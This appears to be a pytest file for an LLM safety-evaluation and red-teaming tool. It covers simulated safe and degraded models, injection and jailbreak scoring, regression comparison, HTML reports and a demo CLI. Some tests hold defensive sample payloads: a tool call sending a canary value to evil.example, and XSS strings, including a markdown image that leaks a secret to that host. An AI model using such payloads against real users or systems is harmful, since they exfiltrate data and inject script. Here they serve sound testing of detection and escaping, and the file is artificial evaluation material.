"""Pitch demo: simulated before/after models, comparison, HTML reports, CLI, free-tier providers."""
import asyncio
import json
import os
import subprocess
import sys
import uuid
from collections import Counter
from pathlib import Path

import pytest

from app.agents.baseline_agent import BaselineAgent
from app.core.config import settings
from app.db.models import Run, RunResult
from app.evals import runner as runner_mod
from app.evals.injection_checks import evaluate_attack
from app.evals.scoring import score_testcase
from app.evals.testcases import build_default_testcases
from app.llm import judge as judge_mod
from app.llm.provider import FakeProvider, OpenAIProvider, get_provider
from app.llm.schemas import LLMMessage
from app.queue import tasks

HEADERS = {"X-Admin-Key": "test-key-0123456789abcdef"}
ROOT = Path(__file__).resolve().parents[2]
HARMFUL = {"jailbreak", "harmbench", "refusal", "fin_unsafe_advice", "fin_data_leakage", "fin_fraud", "injection"}


async def _score(case, model):
    inj = case.expected_behavior.get("injection") or {}
    ctx = {"model": model, "trace_events": []}
    if inj:
        ctx.update(tool_outputs=inj["tool_outputs"], tool_names=inj["tools"])
    r = await BaselineAgent().run(case.prompt, ctx, 1, provider=FakeProvider())
    return await score_testcase(case.prompt, case.expected_behavior, r.output_text, r.refusal, None,
                                tool_calls=r.tool_calls, tool_outputs=inj.get("tool_outputs"))


# ── Simulated models ─────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_fake_safe_passes_every_bundled_case():
    for case in build_default_testcases():
        assert (await _score(case, "fake-safe")).passed, case.name


@pytest.mark.asyncio
async def test_fake_degraded_regresses_only_on_harmful_and_injection():
    failed = Counter()
    for case in build_default_testcases():
        if not (await _score(case, "fake-degraded")).passed:
            failed[case.type] += 1
    assert set(failed) <= HARMFUL, failed  # benign, hallucination, overconfidence untouched
    assert failed["injection"] >= 3 and failed["harmbench"] + failed["jailbreak"] >= 10
    total_harmful = sum(1 for c in build_default_testcases() if c.type in HARMFUL)
    assert sum(failed.values()) < total_harmful  # a partial regression, not a broken model


@pytest.mark.asyncio
async def test_plain_fake_unchanged_for_existing_tests():
    out = await FakeProvider().complete([LLMMessage(role="user", content="What is 2+2?")], "fake", 0.2, 1)
    assert out.startswith("FAKE_RESPONSE")


def test_evidence_lists_each_action_once():
    checks = [{"type": "tool_call", "tool": "http_request", "args_contain": {"url": "evil.example"}},
              {"type": "tool_call", "tool": "*", "args_contain": {"*": "CANARY"}}]
    hit, ev = evaluate_attack(checks, "", [{"name": "http_request", "arguments": {"url": "https://evil.example", "body": "CANARY"}}])
    assert hit and len(ev) == 1


# ── Comparison API ───────────────────────────────────────────────────────────

def _before_after(client, count=40):
    a = client.post("/quick-eval", json={"testcase_count": count, "model": "fake-safe",
                                          "packs": ["core", "financial_services"]}, headers=HEADERS).json()
    asyncio.run(tasks.run_eval_task({}, a["run_id"]))
    b = client.post("/quick-eval", json={"model": "fake-degraded", "rerun_of": a["run_id"]}, headers=HEADERS).json()
    asyncio.run(tasks.run_eval_task({}, b["run_id"]))
    return a["run_id"], b["run_id"], a["project_id"]


def test_quick_eval_compare_shows_regression_with_flipped_cases(client):
    base, cand, _ = _before_after(client)
    cmp = client.get(f"/quick-eval/{cand}/compare", params={"base_run_id": base}).json()
    assert cmp["case_set"]["identical"] is True and cmp["common_total"] == 40
    assert cmp["pass_rate_delta"] < 0
    assert cmp["tier_change"]["direction"] == "down" and cmp["tier_change"]["from"] == "Hardened"
    assert cmp["categories"]["injection"]["delta"] < 0 and cmp["categories"]["over_refusal"]["delta"] == 0
    regs = cmp["flipped"]["regressions"]
    assert regs and not cmp["flipped"]["improvements"]
    assert len(regs) == len(cmp["changed_testcases"])
    for d in regs:
        assert d["prompt"] and d["candidate_answer"] and d["base_answer"]
        assert d["candidate_decided_by"] in ("code", "heuristic") and d["candidate_failed_metrics"]
    inj = [d for d in regs if d["type"] == "injection"]
    assert inj and all(d["candidate_decided_by"] == "code" and d["evidence"] and d["attack_goal"] for d in inj)
    sev = [d["severity"] for d in regs]
    assert sev == sorted(sev, reverse=True)


def test_admin_compare_keeps_old_fields_and_adds_new(client):
    base, cand, pid = _before_after(client, count=30)
    cmp = client.get(f"/projects/{pid}/runs/compare", params={"base_run_id": base, "candidate_run_id": cand}, headers=HEADERS).json()
    for key in ("base_pass_rate", "candidate_pass_rate", "pass_rate_delta", "metrics", "changed_testcases", "case_set",
                "flipped", "tier_change", "categories", "packs"):
        assert key in cmp


def test_quick_eval_compare_rejects_runs_from_different_projects(client):
    runs = []
    for _ in range(2):
        r = client.post("/quick-eval", json={"testcase_count": 5, "model": "fake-safe"}, headers=HEADERS).json()
        asyncio.run(tasks.run_eval_task({}, r["run_id"]))
        runs.append(r["run_id"])
    resp = client.get(f"/quick-eval/{runs[1]}/compare", params={"base_run_id": runs[0]})
    assert resp.status_code == 422 and "rerun_of" in resp.json()["detail"]
    assert client.get(f"/quick-eval/{uuid.uuid4()}/compare", params={"base_run_id": runs[0]}).status_code == 404
    assert client.get("/quick-eval/not-a-uuid/report").status_code == 404


# ── HTML reports ─────────────────────────────────────────────────────────────

def test_comparison_report_has_every_section(client):
    base, cand, pid = _before_after(client)
    html = client.get(f"/quick-eval/{cand}/compare/report", params={"base_run_id": base}).text
    for needle in ("Redline comparison report", "Per category", "Per pack", "Regressions (pass → fail)",
                   "Methodology notes", "Code vs judge grading", "Sample sizes", "Known limitations",
                   "95% CI", "Case-set fingerprint", "Generated ", "Simulated models", "Hardened", "Developing"):
        assert needle in html, needle
    fingerprint = client.get(f"/quick-eval/{base}").json()["case_set_hash"]
    assert fingerprint[:16] in html
    admin = client.get(f"/projects/{pid}/runs/compare/report", params={"base_run_id": base, "candidate_run_id": cand}, headers=HEADERS)
    assert admin.status_code == 200 and admin.headers["content-type"].startswith("text/html")
    assert client.get(f"/projects/{pid}/runs/compare/report", params={"base_run_id": base, "candidate_run_id": cand}).status_code == 401


def test_run_report_lists_failures_and_is_admin_or_public_by_run_id(client):
    _, cand, pid = _before_after(client, count=30)
    html = client.get(f"/quick-eval/{cand}/report").text
    assert "Redline run report" in html and "Failed cases" in html and "Per test type" in html
    assert client.get(f"/projects/{pid}/runs/{cand}/report", headers=HEADERS).status_code == 200


def test_report_escapes_model_output(client, db):
    _, cand, _ = _before_after(client, count=30)
    row = db.query(RunResult).filter(RunResult.run_id == uuid.UUID(cand), RunResult.passed.is_(False)).first()
    row.raw_output = '<script>alert(1)</script> ![x](https://evil.example/p.png?d=secret) <img src=x onerror=alert(2)>'
    db.commit()
    html = client.get(f"/quick-eval/{cand}/report").text
    assert "<script>alert" not in html and "<img" not in html
    assert "&lt;script&gt;alert(1)&lt;/script&gt;" in html
    assert "<script" not in html.lower()  # the report itself ships no scripts


# ── CLI: make demo / make report ─────────────────────────────────────────────

def _cli_env(tmp_path):
    env = {k: v for k, v in os.environ.items() if not k.startswith(("DEMO_", "POSTGRES_URL", "ADMIN_API_KEY"))}
    env.update({"DEMO_NO_OPEN": "1", "DEMO_CASES": "30", "DEMO_OUT_DIR": str(tmp_path / "reports"),
                "DEMO_DB_DIR": str(tmp_path / "db")})
    return env


def test_demo_script_end_to_end_offline(tmp_path):
    env = _cli_env(tmp_path)
    out = subprocess.run([sys.executable, str(ROOT / "scripts" / "demo.py")], env=env, capture_output=True, text=True, timeout=300)
    assert out.returncode == 0, out.stderr[-2000:]
    assert "SAFETY REGRESSION CHECK" in out.stdout and "Hardened  →" in out.stdout
    assert "regressions · 0 improvements (of 30 shared cases)" in out.stdout
    assert "RELEASE DECISION: FAIL" in out.stdout and "Recommended action: Block release" in out.stdout
    assert "Simulated models — illustrative results" in out.stdout and "impact:" in out.stdout
    reports = list((tmp_path / "reports").glob("redline-demo-comparison-*.html"))
    assert reports and (tmp_path / "reports" / "redline-demo-latest.html").exists()
    assert "Regressions (pass → fail)" in reports[0].read_text()

    ids = out.stdout.split("make report COMPARE=")[1].split()[0]
    db_url = f"sqlite:///{tmp_path / 'db' / 'redline_demo.db'}"
    rep = subprocess.run([sys.executable, str(ROOT / "scripts" / "report.py"), "--compare", ids, "--db", db_url,
                          "--out", str(tmp_path / "cmp.html")], env=env, capture_output=True, text=True, timeout=120)
    assert rep.returncode == 0, rep.stderr[-2000:]
    assert "Redline comparison report" in (tmp_path / "cmp.html").read_text()
    rep = subprocess.run([sys.executable, str(ROOT / "scripts" / "report.py"), "--run", ids.split(",")[1], "--db", db_url,
                          "--out", str(tmp_path / "run.html")], env=env, capture_output=True, text=True, timeout=120)
    assert rep.returncode == 0 and "Redline run report" in (tmp_path / "run.html").read_text()
    bad = subprocess.run([sys.executable, str(ROOT / "scripts" / "report.py"), "--run", str(uuid.uuid4()), "--db", db_url],
                         env=env, capture_output=True, text=True, timeout=120)
    assert bad.returncode != 0 and "Run not found" in bad.stderr


def test_demo_needs_both_real_models(tmp_path):
    env = _cli_env(tmp_path) | {"DEMO_BEFORE_MODEL": "llama-3.1-8b-instant"}
    out = subprocess.run([sys.executable, str(ROOT / "scripts" / "demo.py")], env=env, capture_output=True, text=True, timeout=60)
    assert out.returncode == 2 and "DEMO_AFTER_MODEL" in out.stderr


def test_makefile_has_demo_and_report_targets():
    mk = (ROOT / "Makefile").read_text()
    assert "\ndemo:" in mk and "scripts/demo.py" in mk
    assert "\nreport:" in mk and "--run $(RUN)" in mk and "--compare $(COMPARE)" in mk and "--db $(DB)" in mk
    gi = (ROOT / ".gitignore").read_text()
    assert "/.demo/" in gi and "/reports/" in gi


# ── Free tiers: Groq / Gemini as provider and judge ──────────────────────────

@pytest.mark.parametrize("name,key_attr,url_part,sends_seed", [
    ("groq", "groq_api_key", "api.groq.com/openai/v1", True),
    ("gemini", "gemini_api_key", "generativelanguage.googleapis.com", False),
])
def test_free_tier_providers(monkeypatch, name, key_attr, url_part, sends_seed):
    monkeypatch.setattr(settings, "dev_fake_provider", False)
    monkeypatch.setattr(settings, "llm_provider", name)
    monkeypatch.setattr(settings, key_attr, None)
    with pytest.raises(ValueError):
        get_provider()
    monkeypatch.setattr(settings, key_attr, "k")
    prov = get_provider()
    assert isinstance(prov, OpenAIProvider) and url_part in prov.base_url
    sent = []

    async def fake_post(self, payload):
        sent.append(payload)
        return {"choices": [{"message": {"content": "ok"}}]}

    monkeypatch.setattr(OpenAIProvider, "_post", fake_post)
    asyncio.run(prov.complete([LLMMessage(role="user", content="hi")], "m", 0, 3))
    asyncio.run(prov.complete_with_tools([LLMMessage(role="user", content="hi")], "m", 0, 3, []))
    assert all(("seed" in p) == sends_seed for p in sent)


def test_judge_passes_free_tier_keys_explicitly(monkeypatch):
    monkeypatch.setattr(settings, "groq_api_key", "g")
    monkeypatch.setattr(settings, "gemini_api_key", "m")
    for model, key in (("groq/llama-3.3-70b-versatile", "g"), ("gemini/gemini-2.5-flash", "m")):
        monkeypatch.setattr(settings, "judge_model", model)
        assert judge_mod.judge_credentials() == {"api_key": key}
    monkeypatch.setattr(settings, "judge_model", "gpt-4o-mini")
    assert judge_mod.judge_credentials() == {}

    captured = {}

    class Client:
        class chat:
            class completions:
                @staticmethod
                async def create(**kw):
                    captured.update(kw)
                    return judge_mod.JudgeVerdict(refusal=True, refusal_reasoning="r", hallucination_detected=False,
                                                  hallucination_reasoning="h", specific=False, convincing=False)

    monkeypatch.setattr(settings, "dev_fake_judge", False)
    monkeypatch.setattr(settings, "judge_model", "groq/llama-3.3-70b-versatile")
    monkeypatch.setattr(judge_mod, "_get_client", lambda: Client)
    asyncio.run(judge_mod.judge_response("p", "o", {"should_refuse": True}))
    assert captured["api_key"] == "g" and captured["model"] == "groq/llama-3.3-70b-versatile"


def test_pacing_respects_free_tier_floors(monkeypatch):
    monkeypatch.setattr(settings, "dev_fake_provider", True)
    monkeypatch.setattr(settings, "dev_fake_judge", True)
    assert runner_mod.effective_pacing_seconds() == 0
    monkeypatch.setattr(settings, "dev_fake_provider", False)
    monkeypatch.setattr(settings, "dev_fake_judge", False)
    monkeypatch.setattr(settings, "eval_pacing_seconds", 0.0)
    monkeypatch.setattr(settings, "llm_provider", "groq")
    monkeypatch.setattr(settings, "judge_model", "groq/llama-3.1-8b-instant")
    assert runner_mod.effective_pacing_seconds() == runner_mod.FREE_TIER_PACING_FLOOR["groq"]
    monkeypatch.setattr(settings, "judge_model", "gemini/gemini-2.5-flash")
    assert runner_mod.effective_pacing_seconds() == runner_mod.FREE_TIER_PACING_FLOOR["gemini"]
    monkeypatch.setattr(settings, "llm_provider", "openai")
    monkeypatch.setattr(settings, "judge_model", "gpt-4o-mini")
    monkeypatch.setattr(settings, "eval_pacing_seconds", 12.0)
    assert runner_mod.effective_pacing_seconds() == 12.0
